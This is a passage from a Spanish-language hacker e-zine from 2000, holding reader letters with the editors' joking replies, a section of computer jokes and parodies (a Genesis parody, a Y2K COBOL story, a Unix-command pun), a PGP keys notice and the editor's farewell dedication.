http://pleyades.sourceforge.net/go.php?http://www.talmirror.com/0ri0n/0ri0n-1.zip
   (esto es para poder llevar la estadistica de cuantas veces lo han bajado y
    de que mirror proviene).

 [Tkr: Ok.]
 [Nex: Un numero 1 potente, no os canseis. ]

Gracias.

----------------------------------------------------------------
Mr. kl0nk Manson <MkM>
Agente 6 - 0ri0n Team Venezuela
http://www.0ri0n.org
e-Mail: kl0nk@xxxxx.org - kl0nk@xxxxxx.com
Linux Mandrake 7.1 - Kernel 2.2.16
----------------------------------------------------------------
Dime con Q´sistema Operativos trabajas y te dire quien eres..:)
----------------------------------------------------------------

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Thu, 19 Oct 2000 08:39:42 -0400 (EDT)
From:           	falla de sistema anti estado <f_d_s@xxxxxx.com>
Subject:        	salute!

uf, af, clif y claf... una pregunta (sobre lo "criminal")
Ustedes  creen que es criminal  vulnerar un sistema que se dedica a controlar
la vida economica y no economica de cada ser idotizado por el estado?

 [Tkr: Todo depende, depende, de lo que vayas a hacer al vulnerar el sistema]
  
Aquella entrevista, la escuche a lo lejos, no puedo opinar sobre ella.

 [Tkr: Yo  no  la escuche, asi que tampoco puedo opinar sobre ella, aunque si
  me regalas una copia, ya sea un mpeg o algo, me gustaria verla, imagina que
  sera la que le hicieron a plaxius... o no..??]

¿que mas criminal que el estado? ¿que mas criminal que matar de hambre?

 [Tkr: Que mas criminal que regalar 40.000 Kilometros  para  que  la guerrila
  haga de  las  suyas,  que  mas  criminal  que  aumentar los  impuestos para
  remediar los errores del gobierno... en fin, tienes razon.]

Entiendo  vuestra postura,  aunque no la respeto y no respetarla no significa
que los odie, sino... que no me admira.

 [Tkr: Que no me admira, o que no nos admiras...??] 

Salute!

Somos los hermanos de la luz y los hijos de la oscuridad...

 [Tkr: Y que las llamas nos cocinen en el infierno...!!!]

kaxfak.

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"richard_matheus"@xxxxx.com
Date sent:      	Thu, 26 Oct 2000 14:59:50 -0400
Subject:        	Consulta...

Buenas Tardes,

   Me dirijo a Uds.,  en la oportunidad de  consultarles que debo  hacer para
convertirme en hackers, hace algunos dias  me entere de algunas  cosas de las
que son capaces de hacer, y queria saber si existia la  posibilidad de que me
conviertieran  en su  alumno... o  por lo menos  que debo leer, cual es  fin,
sugerencias que de alguna forma me puedan  permitir aprender un  poco o mucho
de Uds., si de alguna manera pudieran brindarme su apoyo en la solicitud, se
los agradeceria y hasta podrian contar con una nueva mano amiga.

Sin mas a que hacer referencia y esperando su pronta respuesta, quedo de Uds.

 [Tkr: Lo siento, hace unos a~os prometi no volver a convertir a nadie, pues
  La  ultima  vez  que  lo  intente,  no resulto como yo esperaba, desde eso,
  decidi dejar la varita magica en mi casa, encerrada bajo llave...
  Y tengo SAPOS que me odian.]


                           Saludos...


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

              ..--:: 13. Chistes, Cuentos y otras burradas ::--..
                                  by Varios

 	       -->> Seccion posible gracias a marqueze.net <<--

Parejas Informaticas
--------------------

¿En cual de estas clasificaciones esta su pareja?

- Pareja RAM: La que no se acuerda de lo que hizo la noche anterior.
- Pareja Disco Duro: Es la que le recuerda todo cuanto usted hace o ha hecho.
- Pareja Hardware:  A la que se  le busca  por su  dise~o exterior...  por su 
  aspecto puramente fisico.
- Pareja Software: A la que solo se acude para que le resuelva sus problemas.
- Pareja GetRight: Se pasa el dia bajandose todo.
- Pareja raton: La arrastrada.
- Pareja escaner: Se pega pasadas con todos.
- Pareja Motherboard: La clasica mama controladora.
- Pareja Palmtop: Chiquita pero eficiente.
- Pareja Monitor: Solo quiere que la vean a ella.
- Pareja Soundblaster: Tiene una voz bonita.
- Pareja USB: Gusta de conectarse con cualquier "dispositivo".
- Pareja Backspace: La que desearia volver con uno.
- Pareja Microsoft:  Siempre  nos  recibe  con un  espectacular ¿ Hasta donde 
  quieres llegar hoy?".
- Pareja Office: Un solo "paquete"  para varias  aplicaciones ...  ¿ Para que 
  quiere mas?
- Pareja Antivirus: Le quita la gripe con calentura.
- Pareja Univac: Muy grande, muy lenta y se calienta muy rapido.
- Pareja DOS: Todos la usaron algun dia, pero ya nadie la quiere.
- Pareja Historial: Se la pasa  recordandole a  uno todas  con las  que se ha 
  metido.
- Pareja Clonica: Buena, bonita y barata.
- Pareja DVD: Se ve de pelicula.
- Pareja Backup: La que siempre hay que tener en caso de emergencia.
- Pareja PhotoShop: La que mejor pinta, pero la que mas vale.
- Pareja Corel: Cuando se desmaquilla no es tan guapa, pero es tan buena...
- Pareja Multimedia: Le gusta por todos los..... medios.
- Pareja Encarta: Sabe un monton de tonterias.
- Pareja Windows98: Aquella que se pasa todo el dia colgada.
- Pareja Windows 95: Ha pasado por el 80 por ciento de los hogares del mundo.

<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<->->->->->->->->->->->->->->->->->->->

Sexo en Unix
------------

Metodo 1:
# unzip ; strip ; touch ; finger ; mount ; fsck ; more ; yes ; umount ; sleep

Version Upgrade:
# unzip ; strip ; touch ; finger ; mount ; fsck ; more ; yes ; umount 
# at now +1 hour unzip ; strip ; touch ; finger ; mount ; fsck ; more ; yes ;
  umount <Ctrl-D> # sleep

Metodo en SVR4:
# unzip ; strip ; touch ; finger ; mount ; fsck ; more ; yes ; umount; wait 
# iostat; test; more; clean; expand; touch; man intro; putdev; fold; pack; 

<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<->->->->->->->->->->->->->->->->->->->

Sintomas de que su hijo se esta convirtiendo en un hacker
---------------------------------------------------------

1.- Para llamar la atencion, en la fiesta de noche vieja, conto algunos 
    secretitos del Pentagono.
2.- Sabia el final de Medico de Familia con dos meses de anticipacion.
3.- La ultima vez que se peleo con el padre, amenazo con bajarle el sueldo en 
    la empresa.
4.- Cuando alguno esta por viajar, el mocoso enseguida salta y pregunta: 
    "¿Fumador o no fumador?".
5.- Cuando su padre comenta en voz alta: "Se desmantelo el proyecto 'AGUILA'"
    el dice en voz baja "POR AHORA".
6.- Habla horas por telefono con una novia que se llama Internet.
7.- Por mas que usted se esfuerce, no logra poner en rojo las tarjetas de 
    credito de su marido.
8.- Cualquier profesor que se mete con su hijo, termina con la casa 
    bombardeada por el sistema de defensa espacial de EE.UU..
9.- En lugar del boletin, el nene presenta todos los meses el estado de 
    cuenta de un banco suizo.
    
<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<->->->->->->->->->->->->->->->->->->->

La Creacion
-----------

- En el principio Dios creo el Bit y el Byte. Y de ellos creo la Palabra.

- Y habia 2 Bytes en la Palabra; y nada mas existia. Y Dios separo el Uno del 
  Cero: y vio que era bueno.

- Y Dios dijo: que se hagan los Datos; y asi paso . Y Dios dijo:  dejemos los
  Datos en sus correspondientes sitios.  Y creo  los  diskettes,  los  discos 
  duros y los discos compactos.

- Y Dios dijo: que se hagan los ordenadores, asi  habra un lugar  donde poner 
  los diskettes, los discos duros y  los discos  compactos. Asi Dios creo los
  ordenadores, y les llamo hardware.

- Pero  aun  no  habia  software.  Pero  Dios creo los programas;  grandes  y 
  peque~os... Y les dijo: Id y multiplicaos y llenad toda la memoria.

- Y Dios  dijo:  creare  el  Programador;  y  el  Programador  creara  nuevos 
  programas y gobernara los ordenadores y los programas y los datos.

- Y Dios creo al Programador; y lo puso en  el Centro  de  Datos;  y  Dios le 
  ense~o  al  Programador  el  Directorio y  le dijo:  Puedes usar  todos los 
  volumenes y subdirectorios, pero NO USES Windows.

- Y Dios dijo: no es bueno que el programador  este solo.  Cogio una costilla
  del cuerpo del Programador y creo una criatura que miraria al  Programador;
  y admirara al Programador; y amara las cosas que  el Programador hiciese. Y
  Dios llamo a la criatura Usuario.

- Y el Programador y el Usuario fueron dejados  en el desnudo  DOS y  eso era 
  bueno.

- Pero Bill era mas listo que todas las otras  criaturas  de Dios.  Y Bill le
  dijo al  Usuario:  Te  dijo  Dios  realmente  que  no ejecutaras  todos los 
  programas?

- Y el Usuario respondio : Dios nos dijo que podiamos usar cualquier programa
  y cualquier volumen de datos, pero nos dijo que  no ejecutasemos  Windows o 
  moririamos.

- Y Bill le dijo al Usuario: Como puedes hablar de  algo que  incluso no  has
  probado? En el momento en que ejecutes  Windows seras  igual a Dios.  Seras 
  capaz de crear cualquier cosa que quieras con el simple toque del raton.

- Y el Usuario vio que los frutos del Windows eran  mas bonitos y  faciles de
  usar. Y el  Usuario vio  que todo  conocimiento era  inutil, ya que Windows 
  podia reemplazarlo.

- Asi el Usuario instalo Windows en su  ordenador; y le  dijo al  programador 
  que era bueno.

- Y el programador inmediatamente empezo  a  buscar  nuevos  controladores. Y 
  Dios le pregunto : Que buscas? Y el Programador respondio :  Estoy buscando
  nuevos controladores porque no puedo encontrarlos  en el DOS.  Y Dios dijo: 
  Quien  te  dijo  que  necesitabas  nuevos  controladores?  Acaso ejecutaste 
  Windows? Y el Programador dijo: fue Bill quien nos lo dijo...

- Y Dios le dijo  a Bill:  Por lo  que hiciste,  seras odiado  por  todas las 
  criaturas.  Y  el  Usuario  siempre estara  descontento contigo.  Y siempre 
  venderas Windows.

- Y Dios le dijo al Usuario: Por lo que hiciste, el Windows te decepcionara y
  se comera todos tus recursos; y tendras que usar malos programas; y siempre
  permaneceras bajo la ayuda del Programador.

- Y Dios  le dijo al Programador: Por haber escuchado  al Usuario nunca seras 
  feliz. Todos tus programas  tendran  errores  y tendras  que  corregirlos y 
  corregirlos hasta el final de los tiempos.

- Y Dios  los echo a todos del Centro de  Datos y bloqueo  la puerta  con una 
  clave de acceso.

 		 			Jorge Chaves - Costa Rica

<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<->->->->->->->->->->->->->->->->->->->

La problematica del a~o 2.000
-----------------------------

Habia un programador de COBOL, llamado Jack, que vivia a finales de los 90.

Tras muchos a~os en los que todos los programadores de UNIX, programadores de
Cliente Servidor y  desarrolladores  de Web  le trataran  como un  dinosaurio 
tecnologico, Jack estaba consiguiendo por fin algo de respeto.

Se habia convertido en un consultor privado especializado en conversiones del
a~o  2000.  Habia  trabajado  en   tareas  a   corto  plazo   para  compa~ias 
prestigiosas,  viajando  por  todo  el  mundo realizando distintos proyectos. 
Trabajaba 70 80 y hasta 90 horas semanales.

Pero varios a~os de este trabajo  apresurado  y agotador  estaba  cobrando su 
deuda a Jack. Tenia problemas para dormir y empezo a tener sue~os angustiosos
respecto al a~o 2000. Habia llegado a un punto en el que incluso pensar en el
a~o 2000 le ponia casi violento.

Sufrio una crisis porque solo podia pensar en la manera de evitar el a~o 2000.
Jack decidio ponerse en contacto con una compa~ia especializada en criogenia. 
Hizo un trato para congelarse hasta el 15 de  Marzo del 2000.  Era un proceso 
muy caro  y totalmente  automatizado.  Estaba muy excitado.  Lo siguiente que 
sabria es  que se habria  despertado en el 2000 despues de las fiestas de A~o 
Nuevo y de los  problemas  informaticos  despues del  dia del gran  salto. No 
habria nada mas de lo que preocuparse excepto de seguir con su vida.

Fue introducido en su camara criogenica los tecnicos ajustaron la fecha en la
que  despertaria le  administraron  inyecciones para  ralentizar su  pulso al 
minimo y ya esta.

Lo siguiente que vio Jack fue una enorme y moderna habitacion  llena de gente
excitadisima.  Todos gritaban:  ¡No me lo puedo crees!  ¡Es un milagro! ¡Esta 
vivo!. Habia  camaras que no  se parecian a ninguna que hubiese visto antes y
equipamiento que parecia sacado  de una pelicula  de ciencia ficcion. Alguien
que obviamente era un portavoz del grupo se adelanto.

Jack no podia contener su entusiasmo  ¿Ya esta  pregunto?  ¿Ya ha  llegado el 
2000? ¿Se han terminado todas las fiestas  de cambio de  milenio y  todas las 
crisis?.  El  portavoz  le  explico  que  habia  habido  un  problema  con la 
programacion del temporizador de la camara criogenica de Jack y no habia sido
preparada para el a~o 2000. En realidad habian pasado mas de 7.000 a~os, pero
el portavoz le dijo a Jack que  no debia  enfadarse.  Alguien  MUY importante 
queria hablar con el en ese mismo momento. De repente una pantalla del tama~o
de una pared mostro la imagen de un hombre que se parecia mucho a Bill Gates.
Era el Primer Ministro de la Tierra. Le dijo a Jack  que no se  enfadara, que 
esta era una epoca magnifica para vivir. Habia paz mundial y no habia hambre,
el programa espacial habia continuado y ya existian colonias en la  Luna y en 
Marte.

La tecnologia habia  avanzado  hasta  tal  punto  que  todo  el  mundo  tenia 
interfaces de  realidad virtual  que les  permitian  ponerse en  contacto con 
cualquier otra persona en el planeta o ver cualquier  espectaculo  o escuchar
musica grabada en cualquier lugar.

¿Eso  suena maravilloso!  dijo Jack,  pero  ¿Por que esta todo  el  mundo tan 
interesado en mi?

"Bueno, dijo el Primer Ministro, el a~o 10.000 esta a la vuelta de la esquina
y en tu curriculum pone que sabes COBOL............"

							Joaquin  				


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                         ..--:: 14. Llaves PGP ::--..
                                   by CDLR

  Esta seccion no se para que diablos se pone, porque jamas hemos recibido ni
un solo  correo encriptado, ...  en fin, pero por si acaso le da a alguien la 
paranoia, tiene las llaves PGP de toda la gente del staff en:

                             www.cdlr.org/llaves/

  Que seccion mas corta ....

:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                       ..--:: 18. A tomar por... ::--..
                                  by Editor
                       
  Por fin se acabo, ....  (y eso que estas  lineas las escribo cuando todavia
me  faltan dos  articulos xD).  Bueno,  el caso es que esta despedida  va con 
dedicatoria, quisiera dedicar este numero  de la R a todas  aquellas personas 
que algun dia se molestaron en pelear por el hack y la seguridad en redes.

  Esta R 10 va  dedicada  a mucha  gente,  Raretrip,  Raven Spirit,  Eljaker, 
Warezzman (a pesar de todo...),  Galahad,  Wendigo,  FastData, ...  y  muchos 
mas, seguro que se me olvida alguno, ...

Algunos de estos ya no estan, otros siguen como  el primer dia,  otros siguen
por ahi, pero con otros handles y otros proyectos, ... por todos ellos.

:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

  nexocase:~ # date
  Sat Oct  7 03:20:51 GMT+1 2000
  nexocase:~ # write teespy na, pos sacaremos el zine en un par de dias ...
  
